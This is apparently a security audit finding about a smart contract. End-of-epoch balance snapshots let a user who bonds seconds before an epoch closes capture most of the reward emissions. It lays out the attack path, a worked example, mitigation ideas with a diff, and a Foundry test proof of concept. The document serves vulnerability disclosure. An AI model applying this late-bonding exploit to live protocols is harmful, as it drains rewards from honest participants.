  "body": "## Finding description and impact\n\n----\n\n### Summary\n\nRewards for each epoch are calculated using the user's veTRUST balance at the **end of the epoch**. Because the system relies on a single timestamp snapshot, users who bond immediately before epoch close can receive the same reward share as users who participated throughout the entire epoch.\n\nThis allows attackers to capture a disproportionate share of emissions while only participating for a negligible portion of the epoch.\n\n----\n\n### Root Cause\n\nReward calculation uses the user balance at epoch end:\n\n`_userEligibleRewardsForEpoch()`\n[File: src/protocol/emissions/TrustBonding.sol#L475-L492](https://github.com/code-423n4/2026-03-intuition/blob/314b7d4d9ccbaf27e4484a6c0706af83d3f75f36/src/protocol/emissions/TrustBonding.sol#L475-L492)\n```solidity\nfunction _userEligibleRewardsForEpoch(address account, uint256 epoch)\n    internal\n    view\n    returns (uint256)\n{\n @> uint256 userBalance = userBondedBalanceAtEpochEnd(account, epoch);\n @> uint256 totalBalance = totalBondedBalanceAtEpochEnd(epoch);\n\n    if (userBalance == 0 || totalBalance == 0) {\n        return 0;\n    }\n\n    return userBalance * _emissionsForEpoch(epoch) / totalBalance;\n}\n```\nThe balance is obtained from:\n\n`userBondedBalanceAtEpochEnd()`\n[File: src/protocol/emissions/TrustBonding.sol#L203-L213](https://github.com/code-423n4/2026-03-intuition/blob/314b7d4d9ccbaf27e4484a6c0706af83d3f75f36/src/protocol/emissions/TrustBonding.sol#L203-L213)\n```solidity\nfunction userBondedBalanceAtEpochEnd(address account, uint256 epoch)\n    public\n    view\n    returns (uint256)\n{\n @> return _balanceOf(account, _epochTimestampEnd(epoch));\n}\n```\nBecause balances are evaluated only at the epoch end timestamp, the system ignores **how long the user held veTRUST during the epoch**.\n\n----\n\n### Attack Path\n\n1. Honest users bond at the beginning of the epoch.\n2. Attacker waits until the last seconds of the epoch.\n3. Attacker bonds a large amount of TRUST with a long lock.\n4. Epoch ends and rewards are calculated using the attacker's large veTRUST balance.\n5. Attacker receives a majority of emissions despite participating briefly.\n\nThis strategy can be repeated every epoch.\n\n----\n\n### Impact\n\nLate bonding allows attackers to dilute rewards for honest participants.\n\nExample:\n\nAlice bonds `1,000 TRUST` at epoch start.  \nBob bonds `9,000 TRUST` **1 second before epoch end**.\n\nAt epoch close:\n\n`Alice ≈ 1,000 veTRUST`  \n`Bob ≈ 9,000 veTRUST`\n\nReward distribution:\n\n`Bob ≈ 90% of emissions`  \n`Alice ≈ 10%`\n\nDespite Alice participating for the entire epoch, Bob captures the majority of rewards after bonding only seconds before epoch close.\n\n----\n\n## Recommended mitigation steps\n\nRewards should reflect **time-weighted participation** instead of a single end-of-epoch snapshot.\n\nPossible approaches:\n\n- Snapshot balances at `epoch start`\n- Implement time-weighted balance accounting\n- Introduce checkpoint-based reward accounting similar to gauge systems\n\n----\n\n### Mitigation Diff\n\nUse balances recorded at epoch start instead of epoch end.\n\n```diff\n- uint256 userBalance = userBondedBalanceAtEpochEnd(account, epoch);\n- uint256 totalBalance = totalBondedBalanceAtEpochEnd(epoch);\n+ uint256 userBalance = userBondedBalanceAtEpochStart(account, epoch);\n+ uint256 totalBalance = totalBondedBalanceAtEpochStart(epoch);",
  "proof_of_concept": "```solidity\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8 .29;\n\nimport { BaseTest } from \"./BaseTest.t.sol\";\n\ncontract PoCCore is BaseTest {\n  function test_submissionValidity() external {\n    vm.deal(address(protocol.satelliteEmissionsController), 10_000_000 ether);\n    \n    uint256 ALICE_AMOUNT = 1_000 ether;\n    uint256 BOB_AMOUNT = 9_000 ether;\n    \n    \n    uint256 twoYearLockEnd = ((block.timestamp + 730 days) / 1 weeks) * 1 weeks;\n    resetPrank(users.alice);\n    protocol.trustBonding.create_lock(ALICE_AMOUNT, twoYearLockEnd);\n    \n    \n    uint256 epochZeroEnd = protocol.trustBonding.epochTimestampEnd(0);\n    vm.warp(epochZeroEnd - 1);\n    \n    uint256 bobLockEnd = ((block.timestamp + 730 days) / 1 weeks) * 1 weeks;\n    resetPrank(users.bob);\n    protocol.trustBonding.create_lock(BOB_AMOUNT, bobLockEnd);\n\n    uint256 aliceAtEpochEnd = protocol.trustBonding.userBondedBalanceAtEpochEnd(users.alice, 0);\n    uint256 bobAtEpochEnd = protocol.trustBonding.userBondedBalanceAtEpochEnd(users.bob, 0);\n    uint256 totalAtEpochEnd = protocol.trustBonding.totalBondedBalanceAtEpochEnd(0);\n    \n    \n    assertGt(bobAtEpochEnd, aliceAtEpochEnd * 8,\n      \"Bob has >8x Alice's balance after 1 second of participation\");\n    \n    // Advance to epoch 1 — epoch 0 rewards now claimable \n    // claimRewards() claims prevEpoch = currentEpoch - 1\n    // must be in epoch 1 to claim epoch 0, not epoch 2\n    vm.warp(epochZeroEnd + 1);\n    assertEq(protocol.trustBonding.currentEpoch(), 1, \"should be epoch 1\");\n    \n    // ── Check eligible rewards for epoch 0 \n    uint256 aliceEligible = protocol.trustBonding.userEligibleRewardsForEpoch(users.alice, 0);\n    uint256 bobEligible = protocol.trustBonding.userEligibleRewardsForEpoch(users.bob, 0);\n    uint256 epoch0Emissions = protocol.trustBonding.emissionsForEpoch(0);\n    \n    \n    // Both claim epoch 0 rewards \n    resetPrank(users.alice);\n    protocol.trustBonding.claimRewards(users.alice);\n    \n    resetPrank(users.bob);\n    protocol.trustBonding.claimRewards(users.bob);\n    \n    uint256 aliceClaimed = protocol.trustBonding.userClaimedRewardsForEpoch(users.alice, 0);\n    uint256 bobClaimed = protocol.trustBonding.userClaimedRewardsForEpoch(users.bob, 0);\n    \n    \n    assertGt(bobClaimed, aliceClaimed * 8,\n      \"Bob captures >8x Alice's rewards despite 1 second of participation\");\n    assertGt(bobClaimed * 100, epoch0Emissions * 80,\n      \"Bob captures >80% of epoch emissions with 1 second of participation\");\n    assertLt(aliceClaimed * 100, epoch0Emissions * 20,\n      \"Alice receives <20% despite full epoch participation\");\n    assertApproxEqAbs(aliceClaimed + bobClaimed, epoch0Emissions, 1e6,\n      \"Total claimed equals epoch emissions\");\n  }\n}\n```",
